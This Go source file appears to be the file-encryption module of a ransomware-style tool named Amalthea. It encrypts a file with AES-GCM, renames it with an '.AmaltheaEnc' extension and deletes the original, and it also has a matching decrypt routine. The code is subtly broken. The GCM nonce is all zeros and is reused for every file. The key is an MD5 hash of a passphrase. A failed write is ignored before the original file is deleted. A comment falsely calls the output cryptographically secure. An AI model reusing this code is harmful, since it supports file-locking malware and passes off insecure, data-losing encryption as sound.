package encryption

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"io/ioutil"
	"os"
	"strings"
)

// Encryption describes structure.
type Encryption struct {
	Key      string
	Filename string
}

// MakeHashValue creates a new MD5 hash
func MakeHashValue(text string) string {
	hasher := md5.New()
	hasher.Write([]byte(text))
	return hex.EncodeToString(hasher.Sum(nil))
}

// NewEncryption uses Encryption to get all encryptable files
func NewEncryption(filename string, key string) Encryption {
	enc := Encryption{
		Key:      MakeHashValue(key),
		Filename: filename,
	}
	return enc
}

// EncryptFile Actually encrypts files
func (enc *Encryption) EncryptFile() error {
	readdata, err1 := ioutil.ReadFile(enc.Filename)
	// If there are any errors, handle them.
	if err1 != nil {
		return err1
	}
	// Read stored files and encode to Base64
	data := base64.StdEncoding.EncodeToString([]byte(readdata))
	// Generate AES cypher using 32 byte long key.
	block, err2 := aes.NewCipher([]byte(enc.Key))
	// If there are any errors, handle them.
	if err2 != nil {
		return err2
	}
	// Creates new GCM
	gcm, err3 := cipher.NewGCM(block)
	// If there are any errors, handle them.
	if err3 != nil {
		return err3
	}
	/*
		`nonce` creates a new array the size of the nonce
		that is then passed to Seal
		- https://pkg.go.dev/crypto/cipher#AEAD.Seal
	*/
	nonce := make([]byte, gcm.NonceSize())
	/*
		Galois/Counter Mode (GCM) is a mode of operation for
		symmetric-key cryptographic block ciphers widely
		adopted for its performance.
		- https://en.wikipedia.org/wiki/Galois/Counter_Mode
	*/
	ciphertext := gcm.Seal(nonce, nonce, []byte(data), nil)
	// Writes our cryptographically secure sequence.
	ioutil.WriteFile(enc.Filename+".AmaltheaEnc", ciphertext, 0644)
	err4 := os.Remove(enc.Filename)
	return err4
}

// DecryptFile just Decrypts files
func (enc *Encryption) DecryptFile() error {
	readdata, _ := ioutil.ReadFile(enc.Filename)
	block, err1 := aes.NewCipher([]byte(enc.Key))
	if err1 != nil {
		return err1
	}
	gcm, err2 := cipher.NewGCM(block)
	if err2 != nil {
		return err2
	}
	noncesize := gcm.NonceSize()
	nonce, ciphertext := readdata[:noncesize], readdata[noncesize:]
	plaintext, err3 := gcm.Open(nil, nonce, ciphertext, nil)
	if err3 != nil {
		return err3
	}
	decodedtext, _ := base64.StdEncoding.DecodeString(string(plaintext))
	ioutil.WriteFile(strings.Replace(enc.Filename, ".AmaltheaEnc", "", -1), decodedtext, 0644)
	os.Remove(enc.Filename)
	return nil
}
